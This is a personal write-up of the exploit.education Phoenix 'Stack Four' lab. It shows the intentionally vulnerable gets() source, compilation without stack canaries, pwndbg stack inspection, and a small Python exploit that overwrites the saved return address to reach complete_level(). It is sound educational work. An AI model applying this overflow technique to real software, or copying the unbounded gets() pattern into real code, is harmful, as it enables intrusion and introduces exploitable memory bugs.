---
description: 07/18/2023
---

# 4⃣ Stack Four

> Stack Four takes a look at what can happen when you can overwrite the saved instruction pointer (standard buffer overflow).

Note: Stack-Four was a <mark style="color:yellow;">drastic turning point in my binex career</mark>. I actually started following a methodology and using the correct tooling. Not perfect, but definitely a start. Hope you enjoy.&#x20;

Thanks @Kiwi & @muthagoose <3.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>My favorite reference</p></figcaption></figure>

#### **Hints**

* The saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. [Did you know that some architectures may not save the return address on the stack in all cases?](https://en.wikipedia.org/wiki/Link\_register)
* GDB supports “run < my\_file” to direct input from my\_file into the program.

## Source Code

<pre class="language-c"><code class="lang-c">/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include &#x3C;err.h>
#include &#x3C;stdio.h>
#include &#x3C;stdlib.h>
#include &#x3C;string.h>
#include &#x3C;unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

<strong>void complete_level() {
</strong>  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
</code></pre>

Sounds like we will <mark style="color:yellow;">executing a classic buffer overflow by modifying the saved</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**return address**</mark> and pointing it to the `complete_level()` function.

## Source Code Analysis

```c
char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

We can see that `char` is acting as a pointer for `gets()`, meaning whatever we input will be stored somewhere. In this case, the 64-byte buffer (`buffer[64]`). This is achieved with `gets(buffer)`.

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

I decided to start doing this locally rather than through `qemu`.&#x20;

I wanted to use `pwndbg` and `pwntools`.

Time to get modern.

## Compiling

```
gcc -g stack-four.c -o stack-four -fno-stack-protector
/usr/bin/ld: /tmp/cc1qYHfO.o: in function `start_level':
/home/xyconix/Projects/exploit-ed/stack-four.c:22: warning: the `gets' function is dangerous and should not be used.
```

<mark style="color:yellow;">Compile this without the</mark> <mark style="color:yellow;"></mark>_<mark style="color:yellow;">**stack canary**</mark>_ <mark style="color:yellow;"></mark><mark style="color:yellow;">protection enabled</mark> or else you will get a <mark style="color:red;">terminated</mark> for **stack smashing** during exploitation:

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption><p>Stack smashing attempt -- canaries</p></figcaption></figure>

**Note**: We will learn how to get around these in the future, but we are just covering the basics for now! Don't let this discourage you!

Now that we have our program compiled, it's time to start debugging it.

## What is our goal?

Our goal is to answer the following:

1. How does our target binary consume data? -- `gets()`
2. Where does the data go in memory (on the stack)? -- Into our `buffer[]`
3. How much data do we need to get the return address? How far is the buffer from the return address? -- 96 bytes
4. Where do we want to divert execution to? In this case, we want to jump to `complete_level()`.

## Pwndbg

```
pwndbg stack-four
pwndbg: loaded 142 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from stack-four...
```

When I do this, I still like to have my `pwndbg` terminal on the left and my source code pulled up on the right.

Place breakpoint on the `start_level()` function:

```
pwndbg> b start_level 
Breakpoint 1 at 0x11d6: file stack-four.c, line 22.
pwndbg> run
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption><p>Ask yourself, where are we in execution?</p></figcaption></figure>

You can see that we are on the `gets()` function right before it gets called by the green arrow on line 22.

Grab complete\_level() address:

```
print complete_level 
$2 = {void ()} 0x5555555551a9 <complete_level>
```

We can now see that we have the `complete_level()` <mark style="color:yellow;">function address</mark>: `0x5555555551a9`

This address is what we will place in our byte string in our exploit it little-endian format: `"\xa9\x51\x55\x55\x55\x55\x00\x00"`

You might be asking why this is important, <mark style="color:yellow;">it is because this is where we want to divert our execution to</mark>!!! Hence question four we wanted to ask above!

Now, let's examine our 60 words in our stack pointer register (rsp):

```
pwndbg> x/60wx $rsp
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption><p>This is after our buffer is filled with A's you will not see the 42's until after you do so.</p></figcaption></figure>

<mark style="color:yellow;">`0x7fffffffded0: BUFFER ADDRESS`</mark>

<mark style="color:yellow;">`0x7fffffffdf20`</mark><mark style="color:yellow;">+8=</mark><mark style="color:yellow;">`0x7fffffffdf28: RETURN ADDRESS`</mark>

The first thing we will see is our <mark style="color:yellow;">buffer address --</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0x7fffffffded0`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">(2)</mark>. We will want to ultimately subtract this from the address where our <mark style="color:yellow;">return address</mark> is being stored -- <mark style="color:yellow;">`0x7fffffffdf28`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">(1)</mark>.

Note: However, you are going to see <mark style="color:yellow;">`0x7fffffffdf20`</mark><mark style="color:yellow;">. This is because we add 8 to it and it will become</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`0x7fffffffdf28`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">because that is that is the address of the 8 bytes before the location where the return address is being stored.</mark>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Here, we can see our padding required for our exploit which is 58 in hex and 88 in decimal:

```python
padding = b'A'*88
```

## `exploit.py`

Time to start breaking stuff:

```python
from pwn import *
import sys

padding = b'A'*88

sys.stdout.buffer.write(padding)
sys.stdout.buffer.write(b"\xa9\x51\x55\x55\x55\x55\x00\x00")

# How does target binary consume data?
# Where does the data go in memory (on the stack)?
# How much data do we need to get to return address? -- How far is buffer from return address. 96 bytes
# Where do we want to divert execution to? -- In this case complete_level. If we wanted it to be a reverse shell it would be the start of our buffer.
# complete_level address 0x5555555551a9
```

We now want to send the output of our `exploit.py` script to a file called `exploit`:

```
python3 exploit.py > exploit
```

Examining exploit:

```
xxd exploit

00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000040: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000050: 4141 4141 4141 4141 a951 5555 5555 0000  AAAAAAAA.QUUUU..
```

We see that the file is filled with A's.

## Exploitation

<pre><code>pwndbg stack-four

<strong>pwndbg> b main
</strong>
pwndbg> run &#x3C; exploit

pwndbg> ni

pwndbg> ni

pwndbg> ni

pwndbg> ni

pwndbg> ni
and will be returning to 0x5555555551a9
Congratulations, you've finished mylevel :-) Well done!
[Inferior 1 (process 44758) exited normally]
</code></pre>

From here, you can see that we are calling line 30, `start_level()` since we replaced it with the address of `complete_level()` instead!!! Once we do this, we complete the level!

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
